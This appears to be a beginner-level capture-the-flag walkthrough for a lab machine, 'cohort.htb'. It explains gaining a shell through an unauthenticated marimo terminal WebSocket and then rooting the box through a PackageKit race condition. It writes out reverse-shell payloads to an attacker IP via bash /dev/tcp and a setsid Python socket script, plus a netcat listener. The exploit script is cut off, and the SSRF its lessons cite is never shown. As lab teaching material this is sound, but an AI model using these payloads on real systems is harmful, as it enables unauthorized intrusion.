Beginner tip — What is TTL? Every IP packet travels through routers to reach its destination. Each router decrements the TTL by 1. Linux starts packets at TTL 64; Windows starts at 128. By the time a packet reaches you, Linux machines typically show ~63 (one hop) and Windows shows ~127. This is a quick OS guess — not always accurate, but usually right. TTL (Time To Live) of ~63 means Linux (Windows uses ~128). Confirms this is a Linux machine.

Beginner tip — What does *.cohort.htb mean? The * in a TLS certificate’s Subject Alternative Name means the certificate covers all subdomains of cohort.htb. This is called a wildcard certificate. It tells us the server is set up to serve multiple subdomains — we just need to find what they are. This becomes important very soon.

What is marimo? Marimo is an open-source Python notebook tool (like Jupyter, but reactive). The important thing here is that notebook tools often include a terminal feature — a browser-based command-line interface. If that terminal is exposed without authentication, it’s instant RCE.

Exploit / Initial Foothold

CVE-2026-39987 — Marimo Unauthenticated Terminal RCE

CVE = Common Vulnerabilities and Exposures. It’s a numbered identifier for a known security flaw.

The vulnerability: Marimo exposes a terminal WebSocket endpoint at /terminal/ws. This terminal gives you a shell on the server. In the vulnerable version, this endpoint has no authentication — anyone who can reach it can execute commands.

What is a WebSocket? Normal HTTP is like a phone call where you speak, hang up, they call back, they speak, hang up, etc. — one message at a time. A WebSocket is like leaving the call connected — both sides can send messages freely at any time without re-connecting. This is how browser-based terminals work: your keystrokes go one way, terminal output comes back the other way, all over a persistent connection.

Why is /terminal/ws unauthenticated a big deal? The marimo notebook terminal runs commands directly on the server’s operating system. It’s designed for developers to use locally. Exposing it externally without login protection is equivalent to giving a stranger a keyboard connected to your server.

The Exploit Script

python
import asyncio
import websockets
import ssl
import sys

async def trigger():

    uri = "wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws"

What is a Reverse Shell?

A reverse shell is when the victim machine reaches out and connects to you, giving you a command-line interface on that machine.

Why “reverse”? Normally you’d connect to a server. But here, the server is behind a firewall and you can’t connect to it directly. So you make the server connect to you instead. You listen on a port, the exploit tells the server “connect here”, and it does.

The payload: bash -i >& /dev/tcp/YOUR_IP/4444 0>&1

  • bash -i → open an interactive bash shell
  • >& /dev/tcp/YOUR_IP/4444 → redirect its output to a TCP connection to your IP on port 4444
  • 0>&1 → also redirect input from that same connection

The \r\n at the end simulates pressing Enter in the terminal.

Why keep the WebSocket alive (the while True loop)? When a parent process dies, it sends SIGHUP to its children — telling them to also quit. If the Python script exits after sending the payload, the WebSocket closes, which kills the terminal, which kills your reverse shell. The infinite loop prevents the script from exiting, keeping the connection alive.

Shell Stability — Why Your Shell Might Die

The initial reverse shell is fragile. If you press Ctrl+C, run certain commands, or the WebSocket gets disrupted, it dies. Here’s how to make it stable.

Option 1 — Quick Python PTY upgrade:

python3 -c 'import pty;pty.spawn("/bin/bash");'
# Then:
# Ctrl+Z (suspend shell)
stty raw -echo; fg
export TERM=xterm

What is a PTY? PTY = Pseudo Terminal. A raw netcat shell has no terminal emulation — it can’t handle arrow keys, Ctrl+C properly, or full-screen programs like vim. Spawning a PTY makes the shell behave like a real terminal window.

Option 2 — Stable setsid shell (your method — recommended if shell keeps dying):

# On the victim machine — write and run a stable shell script
cat > shell.sh << 'EOF'
setsid python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.xx.xxx",4445));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("bash")' < /dev/null > /dev/null 2>&1 &
EOF
chmod 777 shell.sh; ./shell.sh
 
# On your attacker machine — second listener:
nc -lvnp 4445

Why setsid? setsid creates a new session for the process, detaching it from the controlling terminal. This means closing the WebSocket or original shell won’t send a kill signal to the new shell. It runs independently in the background. The < /dev/null > /dev/null 2>&1 redirects away from the terminal entirely, and & puts it in the background. Together, this creates a shell that survives the death of its parent.

Privilege Escalation

What Is Privilege Escalation?

You have a shell as marimo — a regular user with limited permissions. Root (administrator) has full control over the system. Privilege escalation (privesc) is the process of going from low-privilege user → root.

What is PackageKit? PackageKit is a system service that handles installing/removing software packages on Linux. It’s what powers the graphical software installer in Ubuntu’s desktop environment. It runs with root privileges because installing software requires root access.

CVE-2026-41651 — PackageKit TOCTOU LPE

LPE = Local Privilege Escalation (you need to already be on the machine, then this gets you root)

TOCTOU = Time Of Check To Time Of Use — a class of race condition vulnerability

What is a TOCTOU race condition?

Imagine a security guard who checks your ID card at the door, lets you in, but then you swap your ID with a fake one before they can verify again. The guard checked a real ID (Time Of Check), but you used a fake one to do something (Time Of Use). The gap between check and use is the race window.

In PackageKit’s case:

  1. PackageKit checks if it’s allowed to install a package → allowed
  2. Attacker swaps the package content for a malicious one during the tiny gap
  3. PackageKit installs the malicious package as root → root-owned files appear on disk

The exploit creates a SUID bash binary — a copy of /bin/bash that runs as root regardless of who executes it.

What is SUID? SUID (Set User ID) is a special permission bit on Linux executables. When set on a file owned by root, anyone who runs that file gets root’s privileges for the duration of the program. An SUID bash at /tmp/.suid_bash means any user who runs /tmp/.suid_bash -p gets a root shell.

Troubleshooting — If the Exploit Fails

If the TOCTOU race doesn’t win on the first try (race conditions are timing-dependent — they don’t always succeed immediately):

Step 1 — Upgrade your shell first:

python3 -c 'import pty;pty.spawn("/bin/bash");'
# Ctrl+Z
stty raw -echo; fg; export TERM=xterm

Why does shell quality affect this? The TOCTOU exploit is timing-sensitive. An unstable shell with extra latency (like a raw netcat shell) can cause the exploit to miss the race window. A proper PTY shell has more predictable timing.

Step 2 — Re-run the exploit:

./root

The race typically succeeds within 1–3 attempts.

Key Security Lessons

1. SSRF Can Expose Hidden Infrastructure The subdomain was invisible to public scans but reachable via SSRF. Internal services should never be discoverable via external user-controlled requests. Network segmentation and blocking SSRF at the WAF/proxy layer prevents this. 2. Developer Tools Should Never Be Internet-Facing Marimo’s terminal is designed for local developer use. Exposing /terminal/ws publicly — even authenticated — is risky. Unauthenticated is catastrophic. Internal tools need network-level isolation, not just application-level auth. 3. Software Versions Matter PackageKit 1.2.8-2ubuntu1.2 was vulnerable; 1.2.8-2ubuntu1.5 is patched. A difference of three minor package revisions is the difference between a secure system and full root compromise. Keep systems updated and use vulnerability scanners to catch these gaps. 4. Race Conditions Are Hard to Eliminate TOCTOU flaws are among the hardest bugs to fix — the window can be microseconds wide. Proper fixes usually involve atomic operations, file locking (flock), or moving the verification after the action rather than before.
